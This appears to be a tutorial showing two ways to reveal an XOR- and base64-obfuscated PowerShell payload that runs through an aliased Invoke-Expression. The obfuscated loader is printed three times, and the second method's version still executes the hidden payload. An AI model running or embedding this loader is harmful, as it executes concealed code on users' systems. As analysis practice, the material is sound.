```powershell

function encode($plaintext, $key) { 
$cyphertext = ""; 
$keyposition = 0; 
$KeyArray = $key.ToCharArray(); 
$plaintext.ToCharArray() | foreach-object -process {  
$cyphertext += [char]([byte][char]$_ -bxor 
$KeyArray[$keyposition]); 
$keyposition += 1; 
if ($keyposition -eq $key.Length) {$keyposition = 0}
 };
 return $cyphertext}
Set-Alias xxx iex;
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("UwAMAB0AAQAJABUACwAVAEMAWABXAE0ANAADABYAUAAgAAUAFgAGABYAGwAbAAMACgARAAkAQQAzABAABQAfAB0AHwABAAMARQAuAA0ACQAOAEEAUgBMAAQAHgBIAEwAQwA9AFoAKQAdAB4ABwAVAEUAKAAxACwAJABPADsAAgAQABUACQBBADEAIABXADsAFwANAAkAUABIAEwAAwALAFUAZQBWABkAFgAcAEUAXABDAEcAHwAbAAYAHAAXAEoASgBOABQAEgAAAEEAFwAaAA0AHABLAAIADAAIAFgAHwAHAA4ASwAYAAQAAgAIAAAAEwBAAB8ADQAIAAcABAATAAYASwASABcAFwBOAG4AVAAKABQAFwAVAAIAGwBSAFEARABSAEEABAANABMATQAuACIAPAAgADEAMQAgAD8AAQAFAAAAAgAcAAEAFABLAAQAGwAAAFUAZQB4ADsAFgAZABEABABOACoAAgAbAAIAGQAQAFAAQQACAAwACAAaAAoAHAAYAG4AKwArAAQAFwBLACQACgAAABoADQATAAAAMQAMAAwAGQAbAD8ADQAKABEAAgAEABEAOABNAFUAIQAJABYABgAAABMAIAAAAAUAGwAbAAoADQATAAQAFQAGADMAFgADABsACAAFAAQADAAOAA0AJgAWAAMAHgAOAAUAEwAOAEEAXgBFAAwASwAGAB4AEQAVABgAawBHABIAEgANADEAAAANABUACwAVAEMAWABXAAEAFwAbAEkAHwAHAAsABgAGAAMATwAhABUAFwAEAAAADABNACsAEgAbAFwAOwABABIAJgANAAoAAAAZABsAeABIABMAFQAHACIADwAMABIAAQAGAEIAIAAfABIADwAPAAoAFgALADQABQAIABUATQBBAEcAEAAFAAMAXgBMAEAAHwAQABUAEwAQAAMATwBbAGYAbgArADYAGAAQABEAEgACAFwAKAANABEAAgAPAAwAFgADAAYAEQAfAEoAIAAXAA4AAAAAAAQAHAAvAFYAXgAjABEAAAARABEAXwBLAB0AGQAQAAAAEAAVAE8ARQBVAEAAHAADABAAGAAMAA8ABAARABgAHAAXAAkADAAVABcABABBAEwAfQA="));
encode $decoded worldpeace|xxx
```

We can decode the base64 payload from this powershell script in 2 ways:

# Method 1:

The script uses the invoke-Expression cmdlet (iex), we can get the base64 payload by replacing the iex cmlet with write-host:

```powershell

function encode($plaintext, $key) { 
$cyphertext = ""; 
$keyposition = 0; 
$KeyArray = $key.ToCharArray(); 
$plaintext.ToCharArray() | foreach-object -process {  
$cyphertext += [char]([byte][char]$_ -bxor 
$KeyArray[$keyposition]); 
$keyposition += 1; 
if ($keyposition -eq $key.Length) {$keyposition = 0}
 };
 return $cyphertext}
Set-Alias xxx write-host;
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("UwAMAB0AAQAJABUACwAVAEMAWABXAE0ANAADABYAUAAgAAUAFgAGABYAGwAbAAMACgARAAkAQQAzABAABQAfAB0AHwABAAMARQAuAA0ACQAOAEEAUgBMAAQAHgBIAEwAQwA9AFoAKQAdAB4ABwAVAEUAKAAxACwAJABPADsAAgAQABUACQBBADEAIABXADsAFwANAAkAUABIAEwAAwALAFUAZQBWABkAFgAcAEUAXABDAEcAHwAbAAYAHAAXAEoASgBOABQAEgAAAEEAFwAaAA0AHABLAAIADAAIAFgAHwAHAA4ASwAYAAQAAgAIAAAAEwBAAB8ADQAIAAcABAATAAYASwASABcAFwBOAG4AVAAKABQAFwAVAAIAGwBSAFEARABSAEEABAANABMATQAuACIAPAAgADEAMQAgAD8AAQAFAAAAAgAcAAEAFABLAAQAGwAAAFUAZQB4ADsAFgAZABEABABOACoAAgAbAAIAGQAQAFAAQQACAAwACAAaAAoAHAAYAG4AKwArAAQAFwBLACQACgAAABoADQATAAAAMQAMAAwAGQAbAD8ADQAKABEAAgAEABEAOABNAFUAIQAJABYABgAAABMAIAAAAAUAGwAbAAoADQATAAQAFQAGADMAFgADABsACAAFAAQADAAOAA0AJgAWAAMAHgAOAAUAEwAOAEEAXgBFAAwASwAGAB4AEQAVABgAawBHABIAEgANADEAAAANABUACwAVAEMAWABXAAEAFwAbAEkAHwAHAAsABgAGAAMATwAhABUAFwAEAAAADABNACsAEgAbAFwAOwABABIAJgANAAoAAAAZABsAeABIABMAFQAHACIADwAMABIAAQAGAEIAIAAfABIADwAPAAoAFgALADQABQAIABUATQBBAEcAEAAFAAMAXgBMAEAAHwAQABUAEwAQAAMATwBbAGYAbgArADYAGAAQABEAEgACAFwAKAANABEAAgAPAAwAFgADAAYAEQAfAEoAIAAXAA4AAAAAAAQAHAAvAFYAXgAjABEAAAARABEAXwBLAB0AGQAQAAAAEAAVAE8ARQBVAEAAHAADABAAGAAMAA8ABAARABgAHAAXAAkADAAVABcABABBAEwAfQA="));
encode $decoded worldpeace|xxx
```
We can run it debug it in Powershell ISE:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ce05cd84-6b49-4d2b-8820-b4c45c0ac368/Untitled.png)

# Method 2:

Breaking the variable pipes and introducing a new variable:

```powershell

function encode($plaintext, $key) { 
$cyphertext = ""; 
$keyposition = 0; 
$KeyArray = $key.ToCharArray(); 
$plaintext.ToCharArray() | foreach-object -process {  
$cyphertext += [char]([byte][char]$_ -bxor 
$KeyArray[$keyposition]); 
$keyposition += 1; 
if ($keyposition -eq $key.Length) {$keyposition = 0}
 };
return $cyphertext}
Set-Alias xxx iex;
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("UwAMAB0AAQAJABUACwAVAEMAWABXAE0ANAADABYAUAAgAAUAFgAGABYAGwAbAAMACgARAAkAQQAzABAABQAfAB0AHwABAAMARQAuAA0ACQAOAEEAUgBMAAQAHgBIAEwAQwA9AFoAKQAdAB4ABwAVAEUAKAAxACwAJABPADsAAgAQABUACQBBADEAIABXADsAFwANAAkAUABIAEwAAwALAFUAZQBWABkAFgAcAEUAXABDAEcAHwAbAAYAHAAXAEoASgBOABQAEgAAAEEAFwAaAA0AHABLAAIADAAIAFgAHwAHAA4ASwAYAAQAAgAIAAAAEwBAAB8ADQAIAAcABAATAAYASwASABcAFwBOAG4AVAAKABQAFwAVAAIAGwBSAFEARABSAEEABAANABMATQAuACIAPAAgADEAMQAgAD8AAQAFAAAAAgAcAAEAFABLAAQAGwAAAFUAZQB4ADsAFgAZABEABABOACoAAgAbAAIAGQAQAFAAQQACAAwACAAaAAoAHAAYAG4AKwArAAQAFwBLACQACgAAABoADQATAAAAMQAMAAwAGQAbAD8ADQAKABEAAgAEABEAOABNAFUAIQAJABYABgAAABMAIAAAAAUAGwAbAAoADQATAAQAFQAGADMAFgADABsACAAFAAQADAAOAA0AJgAWAAMAHgAOAAUAEwAOAEEAXgBFAAwASwAGAB4AEQAVABgAawBHABIAEgANADEAAAANABUACwAVAEMAWABXAAEAFwAbAEkAHwAHAAsABgAGAAMATwAhABUAFwAEAAAADABNACsAEgAbAFwAOwABABIAJgANAAoAAAAZABsAeABIABMAFQAHACIADwAMABIAAQAGAEIAIAAfABIADwAPAAoAFgALADQABQAIABUATQBBAEcAEAAFAAMAXgBMAEAAHwAQABUAEwAQAAMATwBbAGYAbgArADYAGAAQABEAEgACAFwAKAANABEAAgAPAAwAFgADAAYAEQAfAEoAIAAXAA4AAAAAAAQAHAAvAFYAXgAjABEAAAARABEAXwBLAB0AGQAQAAAAEAAVAE8ARQBVAEAAHAADABAAGAAMAA8ABAARABgAHAAXAAkADAAVABcABABBAEwAfQA="));
$temp = encode $decoded worldpeace
xxx $temp
```

We added a new variable temp. Debug it again in Powershell ISE.
